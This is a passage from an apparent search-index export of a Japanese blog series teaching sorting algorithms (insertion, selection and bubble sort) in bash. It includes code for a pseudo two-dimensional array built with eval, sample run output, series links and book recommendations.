\u0026lt;\u0026gt;insertionSort() # 挿入ソート function insertionSort(){ for((out=1;out\u0026lt;nElems;out++)){ local tmp=$((array[out])); for((in=out;in\u0026gt;0 \u0026amp;\u0026amp; array[in-1]\u0026gt;tmp;in--)){ array[in]=$((array[in-1])); } array[in]=$tmp; } } bash/シェルスクリプトによる疑似２次元配列の実装 ####################################### # 02_3InsertionSort.shを少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; # # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } ## # \u0026lt;\u0026gt;bubbleSort() # バブルソート # URL:https://www.youtube.com/watch?v=xli_FI7CuzA function bubbleSort(){ local tmp_id; local tmp_value; for((i=nElems;i\u0026gt;0;i--)){ for((j=0;j\u0026lt;i-1;j++)){ if(($(aRray[$j].getValue)\u0026gt;$(aRray[$((j+1))].getValue)));then # 交換 tmp_id=$(aRray[$j].getID); tmp_value=$(aRray[$j].getValue); setID \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getID); #IDをセット setValue \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getValue); #Valueをセット setID $((j+1)) $tmp_id; #IDをセット setValue $((j+1)) $tmp_value; #Valueをセット # 交換 fi } } } ## \u0026lt;\u0026gt;selectionSort() # 選択ソート # URL:https://www.youtube.com/watch?v=g-PGLbMth_g function selectionSort(){ local tmp_id; local tmp_value; for((i=0;i\u0026lt;nElems;i++)){ min=$i; for((j=i+1;j\u0026lt;nElems;j++)){ if(($(aRray[$min].getValue)\u0026gt;$(aRray[$j].getValue)));then min=$j; fi } # 交換 tmp_id=$(aRray[$min].getID); tmp_value=$(aRray[$min].getValue); setID \u0026#34;$min\u0026#34; $(aRray[$i].getID); #IDをセット setValue \u0026#34;$min\u0026#34; $(aRray[$i].getValue); #Valueをセット setID $i $tmp_id; #IDをセット setValue $i $tmp_value; #Valueをセット # 交換 } } ## ## \u0026lt;\u0026gt;insertionSort() # 挿入ソート # URL:https://www.youtube.com/watch?v=DFG-XuyPYUQ function insertionSort(){ local tmp_id; local tmp_value; local in; for((out=1;out\u0026lt;nElems;out++)){ tmp_id=$(aRray[$out].getID); tmp_value=$(aRray[$out].getValue); in=$out; while (( in\u0026gt;0 )) \u0026amp;\u0026amp; (( $(aRray[$((in-1))].getValue)\u0026gt;tmp_value ));do setID \u0026#34;$in\u0026#34; $(aRray[$((in-1))].getID); #IDをセット setValue \u0026#34;$in\u0026#34; $(aRray[$((in-1))].getValue); #Valueをセット in=$((in-1)); done setID \u0026#34;$in\u0026#34; $tmp_id; #IDをセット setValue \u0026#34;$in\u0026#34; $tmp_value; #Valueをセット } } # \u0026lt;\u0026gt;execSort() # メインルーチン function execSort(){ local N=$1; setArray $N; #配列をセット echo \u0026#34;修正前\u0026#34; display; #bubbleSort; #バブルソート #selectionSort; #選択ソート insertionSort; echo \u0026#34;修正後\u0026#34; display; } ## # 実行 time execSort 10; exit; 実行結果 bash-5.1$ bash 02_3Eval_InsertionSort.sh 修正前 aRray[0] ID: 100 Value: 16343 aRray[1] ID: 101 Value: 11323 aRray[2] ID: 102 Value: 1381 aRray[3] ID: 103 Value: 15343 aRray[4] ID: 104 Value: 28067 aRray[5] ID: 105 Value: 27342 aRray[6] ID: 106 Value: 32195 aRray[7] ID: 107 Value: 15563 aRray[8] ID: 108 Value: 24240 aRray[9] ID: 109 Value: 28649 修正後 aRray[0] ID: 102 Value: 1381 aRray[1] ID: 101 Value: 11323 aRray[2] ID: 103 Value: 15343 aRray[3] ID: 107 Value: 15563 aRray[4] ID: 100 Value: 16343 aRray[5] ID: 108 Value: 24240 aRray[6] ID: 105 Value: 27342 aRray[7] ID: 104 Value: 28067 aRray[8] ID: 109 Value: 28649 aRray[9] ID: 106 Value: 32195 real\t0m0.145s user\t0m0.062s sys\t0m0.082s bash-5.1$ Valueの値がソートされているのが見てわかると思います。\n処理コスト 挿入ソートの処理コストはバブルソートや選択ソートに負けず劣らず非常に高いわけですが、まずはバブルソート、選択ソートに続き、遅さＮｏ．２を争う挿入ソートの実装ができたわけです。次回からは、さらにもう少しだけ効率的なソート手法の紹介をします。\n処理コストを可視化（いずれ何がどうなのかはわかります）\n挿入ソート３ 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-05T16:36:32+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/","title":"【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２"},{"content":"選択ソート 選択ソートは、未整列の配列要素の中から最小を選択し、配列先頭の整列済み列の末尾に追加していく並べ替えアルゴリズムです。\nバブルソートと処理コストはほぼ同等です。\n意図して選択ソートで並べ替えるといったシチュエーションはまるでありません。\n木構造のヒープソートを学ぶための一里塚としての位置づけとも言われています。\nデータ配列の要素数が小さい場合にのみごまかして使うなどの用途しかありません。\nがんばれ選択ソート！\n選択ソート プログラムソース この章で使っているプログラムソースは以下にあります。\n02_2SelectionSort.sh 一般的な配列の選択ソート\n02_2Eval_SelectionSort.sh 擬似的な２次元配列で実装した選択ソート\n選択ソートの処理手順 １．配列の先頭から小さい順（昇順）に並べる。\n２．先頭から末尾までの間で最も小さい値を見つけ、一時保管場所へ複写する。\n３．配列の最後尾まで行き着いたら、一時保管場所へ複写した「最も小さい値」を、「配列中で最も小さい値」とし、配列の先頭の値と交換すし、交換した要素は完了済みとしてマークする。\n４．処理の再開は、マークした右隣から始める。\n５．最後尾までの間で「最も小さい値」を見つけ、２番目の値と交換し、交換した要素は完了済みとしてマークする。\n６．処理の再開は、マークした右隣から始める。\n７．以降も同様に、n番目から末尾までで最も小さい値をn番目と入れ替えるという操作を繰り返す。\n上記を末尾の一つ前の値まで繰り返せば、先頭が最も小さく末尾が最も大きい数値の列が得られる。\nがんばれ選択ソート！\n選択ソート２ 選択ソートのアルゴリズム バブルソートによく似たアルゴリズムです。\n選択ソートは、最小値を未整列部分の先頭（整列部分の最後尾）に移動させるだけなので、ループにおける値の交換回数が1回です。\nとはいえ、最小値を探すために必要な「要素の値を繰り返し比較する回数」は、バブルソートと同じです。\n結果、バブルソートよりも交換回数が少しだけ少ないので選択ソートの方が高速です。\nBash/シェルスクリプトで実装した一般的な配列で実装した選択ソート。\n## # \u0026lt;\u0026gt;selectionSort # 選択ソート selectionSort(){ for((i=0;i\u0026lt;nElems;i++));do # 一番小さな値を入れるための保管場所 min=$i; for((j=i+1;j\u0026lt;nElems;j++));do if (( array[min] \u0026gt; array[j] ));then min=$j; fi done # 交換 tmp=${array[min]}; array[min]=${array[i]}; array[i]=$tmp; # 交換 done } bash/シェルスクリプトによる疑似２次元配列の実装 ####################################### # 02_2SelectionSort.shを少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; # # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } ## # \u0026lt;\u0026gt;bubbleSort() # バブルソート # URL:https://www.youtube.com/watch?v=xli_FI7CuzA function bubbleSort(){ local tmp_id; local tmp_value; for((i=nElems;i\u0026gt;0;i--)){ for((j=0;j\u0026lt;i-1;j++)){ if(($(aRray[$j].getValue)\u0026gt;$(aRray[$((j+1))].getValue)));then # 交換 tmp_id=$(aRray[$j].getID); tmp_value=$(aRray[$j].getValue); setID \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getID); #IDをセット setValue \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getValue); #Valueをセット setID $((j+1)) $tmp_id; #IDをセット setValue $((j+1)) $tmp_value; #Valueをセット # 交換 fi } } } ## \u0026lt;\u0026gt;selectionSort() # 選択ソート # URL:https://www.youtube.com/watch?v=g-PGLbMth_g function selectionSort(){ local tmp_id; local tmp_value; for((i=0;i\u0026lt;nElems;i++)){ min=$i; for((j=i+1;j\u0026lt;nElems;j++)){ if(($(aRray[$min].getValue)\u0026gt;$(aRray[$j].getValue)));then min=$j; fi } # 交換 tmp_id=$(aRray[$min].getID); tmp_value=$(aRray[$min].getValue); setID \u0026#34;$min\u0026#34; $(aRray[$i].getID); #IDをセット setValue \u0026#34;$min\u0026#34; $(aRray[$i].getValue); #Valueをセット setID $i $tmp_id; #IDをセット setValue $i $tmp_value; #Valueをセット # 交換 } } ## # \u0026lt;\u0026gt;execSort() # メインルーチン function execSort(){ local N=$1; setArray $N; #配列をセット echo \u0026#34;修正前\u0026#34; display; #bubbleSort; #バブルソート selectionSort; #選択ソート echo \u0026#34;修正後\u0026#34; display; } ## # 実行 time execSort 10; exit; 実行結果 bash-5.1$ bash 02_2Eval_SelectionSort.sh 修正前 aRray[0] ID: 100 Value: 26575 aRray[1] ID: 101 Value: 7756 aRray[2] ID: 102 Value: 4820 aRray[3] ID: 103 Value: 27520 aRray[4] ID: 104 Value: 5972 aRray[5] ID: 105 Value: 31315 aRray[6] ID: 106 Value: 11637 aRray[7] ID: 107 Value: 19155 aRray[8] ID: 108 Value: 8036 aRray[9] ID: 109 Value: 20576 修正後 aRray[0] ID: 102 Value: 4820 aRray[1] ID: 104 Value: 5972 aRray[2] ID: 101 Value: 7756 aRray[3] ID: 108 Value: 8036 aRray[4] ID: 106 Value: 11637 aRray[5] ID: 107 Value: 19155 aRray[6] ID: 109 Value: 20576 aRray[7] ID: 100 Value: 26575 aRray[8] ID: 103 Value: 27520 aRray[9] ID: 105 Value: 31315 real 0m0.219s user 0m0.091s sys 0m0.127s bash-5.1$ Valueの値がソートされているのが見てわかると思います。\n処理コスト 選択ソートの処理コストはバブルソートに負けず劣らず非常に高いわけですが、まずはバブルソートに続き、遅さＮｏ．２の選択ソートの実装ができたわけです。次回からは、さらにもう少しだけ効率的なソート手法の紹介をします。\n処理コストを可視化（いずれ何がどうなのかはわかります）\n選択ソート３ 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-05T14:49:14+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/","title":"【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１"},{"content":"バブルソート バブルソートは単純選択方法と同様、実現は簡単です。\nしかし、比較回数と交換回数は最悪の場合、O(N^2)です。\nソート中に選ばれた最大値が水の中の泡のように水面に向かって浮かび上がっていく過程から、バブルソートと呼ばれています。\nデータの交換を中心に行っているため、単純交換法とも言われています。\nバブルソートのイメージは以下の図を見てもらえればと思います。\nバブルソート プログラムソース この章で使っているプログラムソースは以下にあります。\n02_1BubbleSort.sh 一般的な配列のバブルソート\n02_1Eval_BubbleSort.sh 擬似的な２次元配列で実装したバブルソート\nバブルソートの処理手順 データは１次元配列に格納されていると仮定します。\n図の赤枠で囲まれた左右の要素を比較して、\n大きな要素を右に小さな要素を左に配置します。\n移動した段階で左に小さな要素、右に大きな要素がある場合は、要素の交換が不要なので、赤枠は一つ場所を右に移動します。\n右端まで移動しきった場合、一番右の要素には配列の中で最も大きな値を持つ要素が配置されています。\nしかし、それ以外の要素はまだ並べ替えが完了していないので、交換の場所を一番左に移動し、並べ替えが完了した一番右端の一つ手前まで、上記の処理を繰り返します。\nバブルソート２ ２つのループ バブルソートは２つのforループで構成されます。\n外側のforループは、一番右端に最大の値を持つ要素を配置すると、次からはその一つ手前まで、さらにその次は、その一つ手前までといった具合に、配列全体の移動範囲を狭めていきます。\n外側のforループではこうした理由からデクリメントされているわけです。\n内側のforループは左右の要素の交換処理を行います。\n配列の要素（自分自身）と、その要素の一つ右の要素を比較し、配列の要素（自分自身）が、一つ右の要素よりも値が大きければ、自分自身と右側の要素を交換し、右側の要素の値が大きくなるようにした上で、交換場所を一つ右に移動します。\n## # \u0026lt;\u0026gt;bubbleSort() # バブルソートの１次元配列版 function bubbleSort(){ for((i=nElems;i\u0026gt;0;i--));do for((j=0;j\u0026lt;i-1;j++));do # 自分自身と右側の要素を比較 if (( array[j] \u0026gt; array[j+1] ));then # 交換 tmp=${array[j]}; array[j]=${array[j+1]}; array[j+1]=$tmp; # 交換 fi done done } bash/シェルスクリプトによる疑似２次元配列の実装 ####################################### # 02_1BubbleSort.shを、少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; # # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } ## # \u0026lt;\u0026gt;bubbleSort() # バブルソート # URL:https://www.youtube.com/watch?v=xli_FI7CuzA function bubbleSort(){ local tmp_id; local tmp_value; for((i=nElems;i\u0026gt;0;i--)){ for((j=0;j\u0026lt;i-1;j++)){ if(($(aRray[$j].getValue)\u0026gt;$(aRray[$((j+1))].getValue)));then # 交換 tmp_id=$(aRray[$j].getID); tmp_value=$(aRray[$j].getValue); setID \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getID); #IDをセット setValue \u0026#34;$j\u0026#34; $(aRray[$((j+1))].getValue); #Valueをセット setID $((j+1)) $tmp_id; #IDをセット setValue $((j+1)) $tmp_value; #Valueをセット # 交換 fi } } } ## # \u0026lt;\u0026gt;execSort() # メインルーチン function execSort(){ local N=$1; setArray $N; #配列をセット echo \u0026#34;修正前\u0026#34; display; bubbleSort; # バブルソート echo \u0026#34;修正後\u0026#34; display; } ## # 実行 time execSort 10; exit; 実行結果 bash-5.1$ bash 02_1Eval_BubbleSort.sh 修正前 aRray[0] ID: 100 Value: 14256 aRray[1] ID: 101 Value: 2502 aRray[2] ID: 102 Value: 11843 aRray[3] ID: 103 Value: 21197 aRray[4] ID: 104 Value: 30372 aRray[5] ID: 105 Value: 10460 aRray[6] ID: 106 Value: 440 aRray[7] ID: 107 Value: 6641 aRray[8] ID: 108 Value: 12185 aRray[9] ID: 109 Value: 8073 修正後 aRray[0] ID: 106 Value: 440 aRray[1] ID: 101 Value: 2502 aRray[2] ID: 107 Value: 6641 aRray[3] ID: 109 Value: 8073 aRray[4] ID: 105 Value: 10460 aRray[5] ID: 102 Value: 11843 aRray[6] ID: 108 Value: 12185 aRray[7] ID: 100 Value: 14256 aRray[8] ID: 103 Value: 21197 aRray[9] ID: 104 Value: 30372 real 0m0.289s user 0m0.125s sys 0m0.162s bash-5.1$ Valueの値がソートされているのが見てわかると思います。\n処理コスト バブルソートの処理コストは非常に高いわけですが、まずは一番最初のバブルソートの実装ができたわけです。次回からは、もう少しだけ効率的なソート手法の紹介をします。\n処理コストを可視化（いずれ何がどうなのかはわかります）\nバブルソート３ 「ざっくり」シリーズのご紹介 【アルゴリズム 